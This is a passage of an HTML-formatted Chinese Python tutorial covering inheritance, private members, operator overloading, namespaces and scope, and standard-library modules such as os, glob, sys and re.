language-python\" data-language=\"python\"><code class=\"language-python\">父类名称<span class=\"token punctuation\">.</span>__init__<span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span>参数<span class=\"token number\">1</span>，参数<span class=\"token number\">2</span>，<span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">class</span> <span class=\"token class-name\">Father</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">object</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">def</span> <span class=\"token function\">__init__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        self<span class=\"token punctuation\">.</span>name<span class=\"token operator\">=</span>name\n        <span class=\"token keyword\">print</span> <span class=\"token punctuation\">(</span> <span class=\"token string\">\"name: %s\"</span> <span class=\"token operator\">%</span><span class=\"token punctuation\">(</span> self<span class=\"token punctuation\">.</span>name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">def</span> <span class=\"token function\">getName</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">return</span> <span class=\"token string\">'Father '</span> <span class=\"token operator\">+</span> self<span class=\"token punctuation\">.</span>name\n \n<span class=\"token keyword\">class</span> <span class=\"token class-name\">Son</span><span class=\"token punctuation\">(</span>Father<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">def</span> <span class=\"token function\">__init__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        <span class=\"token builtin\">super</span><span class=\"token punctuation\">(</span>Son<span class=\"token punctuation\">,</span> self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>__init__<span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">print</span> <span class=\"token punctuation\">(</span><span class=\"token string\">\"hi\"</span><span class=\"token punctuation\">)</span>\n        self<span class=\"token punctuation\">.</span>name <span class=\"token operator\">=</span>  name\n    <span class=\"token keyword\">def</span> <span class=\"token function\">getName</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">return</span> <span class=\"token string\">'Son '</span><span class=\"token operator\">+</span>self<span class=\"token punctuation\">.</span>name\n \n<span class=\"token keyword\">if</span> __name__<span class=\"token operator\">==</span><span class=\"token string\">'__main__'</span><span class=\"token punctuation\">:</span>\n    son<span class=\"token operator\">=</span>Son<span class=\"token punctuation\">(</span><span class=\"token string\">'runoob'</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">print</span> <span class=\"token punctuation\">(</span> son<span class=\"token punctuation\">.</span>getName<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span>\n    \n<span class=\"token triple-quoted-string string\">'''\nname: runoob\nhi\nSon runoob\n'''</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"类属性与方法\"><a href=\"#类属性与方法\" class=\"headerlink\" title=\"类属性与方法\"></a>类属性与方法</h3><h4 id=\"类的私有属性\"><a href=\"#类的私有属性\" class=\"headerlink\" title=\"类的私有属性\"></a>类的私有属性</h4><p><strong>__private_attrs</strong>：两个下划线开头，声明该属性为私有，不能在类的外部被使用或直接访问。在类内部的方法中使用时 <strong>self.__private_attrs</strong></p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">class</span> <span class=\"token class-name\">JustCounter</span><span class=\"token punctuation\">:</span>\n    __secretCount <span class=\"token operator\">=</span> <span class=\"token number\">0</span>  <span class=\"token comment\"># 私有变量</span>\n    publicCount <span class=\"token operator\">=</span> <span class=\"token number\">0</span>    <span class=\"token comment\"># 公开变量</span>\n \n    <span class=\"token keyword\">def</span> <span class=\"token function\">count</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        self<span class=\"token punctuation\">.</span>__secretCount <span class=\"token operator\">+=</span> <span class=\"token number\">1</span>\n        self<span class=\"token punctuation\">.</span>publicCount <span class=\"token operator\">+=</span> <span class=\"token number\">1</span>\n        <span class=\"token keyword\">print</span> <span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">.</span>__secretCount<span class=\"token punctuation\">)</span>\n \ncounter <span class=\"token operator\">=</span> JustCounter<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\ncounter<span class=\"token punctuation\">.</span>count<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\ncounter<span class=\"token punctuation\">.</span>count<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span> <span class=\"token punctuation\">(</span>counter<span class=\"token punctuation\">.</span>publicCount<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span> <span class=\"token punctuation\">(</span>counter<span class=\"token punctuation\">.</span>__secretCount<span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 报错，实例不能访问私有变量</span>\n\n<span class=\"token triple-quoted-string string\">'''\n1\n2\n2\nTraceback (most recent call last):\n  File \"test.py\", line 16, in &lt;module&gt;\n    print (counter.__secretCount)  # 报错，实例不能访问私有变量\nAttributeError: 'JustCounter' object has no attribute '__secretCount'\n'''</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h4 id=\"类的方法-1\"><a href=\"#类的方法-1\" class=\"headerlink\" title=\"类的方法\"></a>类的方法</h4><p>在类的内部，使用 def 关键字来定义一个方法，与一般函数定义不同，类方法必须包含参数 <strong>self</strong>，且为第一个参数，<strong>self</strong> 代表的是类的实例</p>\n<p><strong>self</strong> 的名字并不是规定死的，也可以使用 <strong>this</strong>，但是最好还是按照约定使用 <strong>self</strong></p>\n<h4 id=\"类的私有方法\"><a href=\"#类的私有方法\" class=\"headerlink\" title=\"类的私有方法\"></a>类的私有方法</h4><p><strong>__private_method</strong>：两个下划线开头，声明该方法为私有方法，只能在类的内部调用 ，不能在类的外部调用<strong>self.__private_methods</strong></p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">class</span> <span class=\"token class-name\">Site</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">def</span> <span class=\"token function\">__init__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> name<span class=\"token punctuation\">,</span> url<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        self<span class=\"token punctuation\">.</span>name <span class=\"token operator\">=</span> name       <span class=\"token comment\"># public</span>\n        self<span class=\"token punctuation\">.</span>__url <span class=\"token operator\">=</span> url   <span class=\"token comment\"># private</span>\n \n    <span class=\"token keyword\">def</span> <span class=\"token function\">who</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'name  : '</span><span class=\"token punctuation\">,</span> self<span class=\"token punctuation\">.</span>name<span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'url : '</span><span class=\"token punctuation\">,</span> self<span class=\"token punctuation\">.</span>__url<span class=\"token punctuation\">)</span>\n \n    <span class=\"token keyword\">def</span> <span class=\"token function\">__foo</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>          <span class=\"token comment\"># 私有方法</span>\n        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'这是私有方法'</span><span class=\"token punctuation\">)</span>\n \n    <span class=\"token keyword\">def</span> <span class=\"token function\">foo</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>            <span class=\"token comment\"># 公共方法</span>\n        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'这是公共方法'</span><span class=\"token punctuation\">)</span>\n        self<span class=\"token punctuation\">.</span>__foo<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n \nx <span class=\"token operator\">=</span> Site<span class=\"token punctuation\">(</span><span class=\"token string\">'菜鸟教程'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'www.runoob.com'</span><span class=\"token punctuation\">)</span>\nx<span class=\"token punctuation\">.</span>who<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>        <span class=\"token comment\"># 正常输出</span>\nx<span class=\"token punctuation\">.</span>foo<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>        <span class=\"token comment\"># 正常输出</span>\nx<span class=\"token punctuation\">.</span>__foo<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>      <span class=\"token comment\"># 报错</span>\n\n<span class=\"token triple-quoted-string string\">'''\nname  :  菜鸟教程\nurl :  www.runoob.com\n这是公共方法\n这是私有方法\nTraceback (most recent call last):\n  File xxxx in &lt;module&gt;\n    x.__foo()  # 报错\nAttributeError: 'Site' object has no attribute '__foo'\n'''</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"类的专有方法\"><a href=\"#类的专有方法\" class=\"headerlink\" title=\"类的专有方法\"></a>类的专有方法</h3><ul>\n<li><strong><strong>init</strong> :</strong> 构造函数，在生成对象时调用</li>\n<li><strong><strong>del</strong> :</strong> 析构函数，释放对象时使用</li>\n<li><strong><strong>repr</strong> :</strong> 打印，转换</li>\n<li><strong><strong>setitem</strong> :</strong> 按照索引赋值</li>\n<li><strong><strong>getitem</strong>:</strong> 按照索引获取值</li>\n<li><strong><strong>len</strong>:</strong> 获得长度</li>\n<li><strong><strong>cmp</strong>:</strong> 比较运算</li>\n<li><strong><strong>call</strong>:</strong> 函数调用</li>\n<li><strong><strong>add</strong>:</strong> 加运算</li>\n<li><strong><strong>sub</strong>:</strong> 减运算</li>\n<li><strong><strong>mul</strong>:</strong> 乘运算</li>\n<li><strong><strong>truediv</strong>:</strong> 除运算</li>\n<li><strong><strong>mod</strong>:</strong> 求余运算</li>\n<li><strong><strong>pow</strong>:</strong> 乘方</li>\n</ul>\n<h3 id=\"运算符重载\"><a href=\"#运算符重载\" class=\"headerlink\" title=\"运算符重载\"></a>运算符重载</h3><pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">class</span> <span class=\"token class-name\">Vector</span><span class=\"token punctuation\">:</span>\n   <span class=\"token keyword\">def</span> <span class=\"token function\">__init__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n      self<span class=\"token punctuation\">.</span>a <span class=\"token operator\">=</span> a\n      self<span class=\"token punctuation\">.</span>b <span class=\"token operator\">=</span> b\n \n   <span class=\"token keyword\">def</span> <span class=\"token function\">__str__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n      <span class=\"token keyword\">return</span> <span class=\"token string\">'Vector (%d, %d)'</span> <span class=\"token operator\">%</span> <span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">.</span>a<span class=\"token punctuation\">,</span> self<span class=\"token punctuation\">.</span>b<span class=\"token punctuation\">)</span>\n   \n   <span class=\"token keyword\">def</span> <span class=\"token function\">__add__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span>other<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n      <span class=\"token keyword\">return</span> Vector<span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">.</span>a <span class=\"token operator\">+</span> other<span class=\"token punctuation\">.</span>a<span class=\"token punctuation\">,</span> self<span class=\"token punctuation\">.</span>b <span class=\"token operator\">+</span> other<span class=\"token punctuation\">.</span>b<span class=\"token punctuation\">)</span>\n \nv1 <span class=\"token operator\">=</span> Vector<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span>\nv2 <span class=\"token operator\">=</span> Vector<span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">,</span><span class=\"token operator\">-</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span> <span class=\"token punctuation\">(</span>v1 <span class=\"token operator\">+</span> v2<span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\"># Vector(7,8)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h2 id=\"命名空间和作用域\"><a href=\"#命名空间和作用域\" class=\"headerlink\" title=\"命名空间和作用域\"></a>命名空间和作用域</h2><h3 id=\"命名空间\"><a href=\"#命名空间\" class=\"headerlink\" title=\"命名空间\"></a>命名空间</h3><ol>\n<li>命名空间(Namespace)是从名称到对象的映射，大部分的命名空间都是通过 Python 字典来实现的</li>\n<li>各个命名空间是独立的，所以一个命名空间中不能有重名，不同的命名空间可以重名</li>\n<li>命名空间的生命周期取决于对象的作用域，如果对象执行完成，则该命名空间的生命周期就结束</li>\n<li>无法从外部命名空间访问内部命名空间的对象</li>\n</ol>\n<p>三种命名空间</p>\n<ul>\n<li><strong>内置名称（built-in names</strong>）， Python 语言内置的名称，比如函数名 abs、char 和异常名称 BaseException、Exception 等等</li>\n<li><strong>全局名称（global names）</strong>，模块中定义的名称，记录了模块的变量，包括函数、类、其它导入的模块、模块级的变量和常量</li>\n<li><strong>局部名称（local names）</strong>，函数中定义的名称，记录了函数的变量，包括函数的参数和局部定义的变量。（类中定义的也是）</li>\n</ul>\n<p>查找顺序为：<strong>局部的命名空间去 -&gt; 全局命名空间 -&gt; 内置命名空间</strong></p>\n<p>如果找不到变量，它将放弃查找并引发一个 NameError 异常</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token comment\"># var1 是全局名称</span>\nvar1 <span class=\"token operator\">=</span> <span class=\"token number\">5</span>\n<span class=\"token keyword\">def</span> <span class=\"token function\">some_func</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n \n    <span class=\"token comment\"># var2 是局部名称</span>\n    var2 <span class=\"token operator\">=</span> <span class=\"token number\">6</span>\n    <span class=\"token keyword\">def</span> <span class=\"token function\">some_inner_func</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n \n        <span class=\"token comment\"># var3 是内嵌的局部名称</span>\n        var3 <span class=\"token operator\">=</span> <span class=\"token number\">7</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"作用域\"><a href=\"#作用域\" class=\"headerlink\" title=\"作用域\"></a>作用域</h3><ol>\n<li>作用域就是一个 Python 程序可以直接访问命名空间的正文区域</li>\n<li>程序的变量并不是在哪个位置都可以访问的，访问权限决定于这个变量是在哪里赋值的</li>\n</ol>\n<p>四种作用域</p>\n<ul>\n<li><strong>L（Local）</strong>：最内层，包含局部变量，比如一个函数/方法内部</li>\n<li><strong>E（Enclosing）</strong>：包含了非局部(non-local)也非全局(non-global)的变量。比如两个嵌套函数，一个函数（或类） A 里面又包含了一个函数 B ，那么对于 B 中的名称来说 A 中的作用域就为 nonlocal</li>\n<li><strong>G（Global）</strong>：当前脚本的最外层，比如当前模块的全局变量。</li>\n<li><strong>B（Built-in）</strong>： 包含了内建的变量/关键字等，最后被搜索。</li>\n</ul>\n<p>规则顺序： <strong>L –&gt; E –&gt; G –&gt; B</strong></p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">g_count <span class=\"token operator\">=</span> <span class=\"token number\">0</span>  <span class=\"token comment\"># 全局作用域</span>\n<span class=\"token keyword\">def</span> <span class=\"token function\">outer</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    o_count <span class=\"token operator\">=</span> <span class=\"token number\">1</span>  <span class=\"token comment\"># 闭包函数外的函数中</span>\n    <span class=\"token keyword\">def</span> <span class=\"token function\">inner</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        i_count <span class=\"token operator\">=</span> <span class=\"token number\">2</span>  <span class=\"token comment\"># 局部作用域</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>内置作用域通过一个名为 builtin 的标准模块来实现</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">import</span> builtins\n\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">dir</span><span class=\"token punctuation\">(</span>builtins<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 输出预定义变量</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<p>Python 中只有模块（module），类（class）以及函数（def、lambda）才会引入新的作用域，其它的代码块（如 if/elif/else/、try/except、for/while等）是不会引入新的作用域的，也就是说这些语句内定义的变量，外部也可以访问</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">if</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span>\n    msg <span class=\"token operator\">=</span> <span class=\"token string\">'I am from Runoob'</span>  <span class=\"token comment\"># 外部可以访问</span>\n    \n<span class=\"token keyword\">def</span> <span class=\"token function\">test</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    msg_inner <span class=\"token operator\">=</span> <span class=\"token string\">'I am from Runoob'</span>  <span class=\"token comment\"># 外部不能访问</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"全局变量和局部变量\"><a href=\"#全局变量和局部变量\" class=\"headerlink\" title=\"全局变量和局部变量\"></a>全局变量和局部变量</h3><ol>\n<li>定义在函数内部的变量拥有一个局部作用域，定义在函数外的拥有全局作用域</li>\n<li>局部变量只能在其被声明的函数内部访问，而全局变量可以在整个程序范围内访问</li>\n<li>调用函数时，所有在函数内声明的变量名称都将被加入到作用域中</li>\n</ol>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">total <span class=\"token operator\">=</span> <span class=\"token number\">0</span> <span class=\"token comment\"># 这是一个全局变量</span>\n<span class=\"token comment\"># 可写函数说明</span>\n<span class=\"token keyword\">def</span> <span class=\"token function\">sum</span><span class=\"token punctuation\">(</span> arg1<span class=\"token punctuation\">,</span> arg2 <span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token comment\">#返回2个参数的和.\"</span>\n    total <span class=\"token operator\">=</span> arg1 <span class=\"token operator\">+</span> arg2 <span class=\"token comment\"># total在这里是局部变量.</span>\n    <span class=\"token keyword\">print</span> <span class=\"token punctuation\">(</span><span class=\"token string\">\"函数内是局部变量 : \"</span><span class=\"token punctuation\">,</span> total<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">return</span> total\n \n<span class=\"token comment\">#调用sum函数</span>\n<span class=\"token builtin\">sum</span><span class=\"token punctuation\">(</span> <span class=\"token number\">10</span><span class=\"token punctuation\">,</span> <span class=\"token number\">20</span> <span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span> <span class=\"token punctuation\">(</span><span class=\"token string\">\"函数外是全局变量 : \"</span><span class=\"token punctuation\">,</span> total<span class=\"token punctuation\">)</span>\n\n\n<span class=\"token triple-quoted-string string\">'''\n函数内是局部变量 :  30\n函数外是全局变量 :  0\n'''</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"global-和-nonlocal关键字\"><a href=\"#global-和-nonlocal关键字\" class=\"headerlink\" title=\"global 和 nonlocal关键字\"></a>global 和 nonlocal关键字</h3><p>当内部作用域想修改外部作用域的变量时，用到 global 和 nonlocal 关键字</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token comment\"># 修改全局变量 num</span>\n\nnum <span class=\"token operator\">=</span> <span class=\"token number\">1</span>\n<span class=\"token keyword\">def</span> <span class=\"token function\">fun1</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">global</span> num  <span class=\"token comment\"># 需要使用 global 关键字声明</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">)</span> \n    num <span class=\"token operator\">=</span> <span class=\"token number\">123</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">)</span>\nfun1<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">)</span>\n\n<span class=\"token triple-quoted-string string\">'''\n1\n123\n123\n'''</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>nonlocal 修改嵌套作用域（enclosing 作用域，外层非全局作用域）中的变量</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">def</span> <span class=\"token function\">outer</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    num <span class=\"token operator\">=</span> <span class=\"token number\">10</span>\n    <span class=\"token keyword\">def</span> <span class=\"token function\">inner</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">nonlocal</span> num   <span class=\"token comment\"># nonlocal关键字声明</span>\n        num <span class=\"token operator\">=</span> <span class=\"token number\">100</span>\n        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">)</span>\n    inner<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">)</span>\nouter<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token triple-quoted-string string\">'''\n100\n100\n'''</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h2 id=\"标准库概览\"><a href=\"#标准库概览\" class=\"headerlink\" title=\"标准库概览\"></a>标准库概览</h2><h3 id=\"操作系统接口\"><a href=\"#操作系统接口\" class=\"headerlink\" title=\"操作系统接口\"></a>操作系统接口</h3><p>os模块提供了不少与操作系统相关联的函数</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">import</span> os\n\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>os<span class=\"token punctuation\">.</span>getcwd<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 返回当前的工作目录</span>\nos<span class=\"token punctuation\">.</span>chdir<span class=\"token punctuation\">(</span><span class=\"token string\">'/server/accesslogs'</span><span class=\"token punctuation\">)</span>   <span class=\"token comment\"># 修改当前的工作目录</span>\nos<span class=\"token punctuation\">.</span>system<span class=\"token punctuation\">(</span><span class=\"token string\">'mkdir today'</span><span class=\"token punctuation\">)</span>   <span class=\"token comment\"># 执行系统命令 mkdir</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">dir</span><span class=\"token punctuation\">(</span>os<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># returns a list of all module functions</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">help</span><span class=\"token punctuation\">(</span>os<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 帮助文档</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>针对日常的文件和目录管理任务，:mod:shutil 模块提供了一个易于使用的高级接口</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">import</span> shutil\nshutil<span class=\"token punctuation\">.</span>copyfile<span class=\"token punctuation\">(</span><span class=\"token string\">'data.db'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'archive.db'</span><span class=\"token punctuation\">)</span>\nshutil<span class=\"token punctuation\">.</span>move<span class=\"token punctuation\">(</span><span class=\"token string\">'/build/executables'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'installdir'</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"文件通配符\"><a href=\"#文件通配符\" class=\"headerlink\" title=\"文件通配符\"></a>文件通配符</h3><p>glob模块提供了一个函数用于从目录通配符搜索中生成文件列表</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">import</span> glob\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>glob<span class=\"token punctuation\">.</span>glob<span class=\"token punctuation\">(</span><span class=\"token string\">'*.py'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># ['xxx.py', 'xxx.py', 'xxx.py']</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"命令行参数\"><a href=\"#命令行参数\" class=\"headerlink\" title=\"命令行参数\"></a>命令行参数</h3><p>通用工具脚本经常调用命令行参数。这些命令行参数以链表形式存储于 sys 模块的 argv 变量。例如在命令行中执行 “python demo.py one two three” 后可以得到以下输出结果:</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">import</span> sys\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<h3 id=\"错误输出重定向和程序终止\"><a href=\"#错误输出重定向和程序终止\" class=\"headerlink\" title=\"错误输出重定向和程序终止\"></a>错误输出重定向和程序终止</h3><p>sys 还有 stdin，stdout 和 stderr 属性，即使在 stdout 被重定向时，后者也可以用于显示警告和错误信息</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">sys<span class=\"token punctuation\">.</span>stderr<span class=\"token punctuation\">.</span>write<span class=\"token punctuation\">(</span><span class=\"token string\">'Warning, log file not found starting a new one\\n'</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>大多脚本的定向终止都使用 sys.exit()</p>\n<h3 id=\"字符串正则匹配\"><a href=\"#字符串正则匹配\" class=\"headerlink\" title=\"字符串正则匹配\"></a>字符串正则匹配</h3><p>re模块为高级字符串处理提供了正则表达式工具</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">import</span> re\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>re<span class=\"token punctuation\">.</span>findall<span class=\"token punctuation\">(</span><span class=\"token string\">r'\\bf[a-z]*'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'which foot or hand fell fastest'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># ['foot', 'fell', 'fastest']</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>re<span class=\"token punctuation\">.</span>sub<span class=\"token punctuation\">(</span><span class=\"token string\">r'(\\b[a-z]+) \\1'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">r'\\1'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'cat in the the hat'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># 'cat in the hat'</span><span aria-hidden=\"true\" 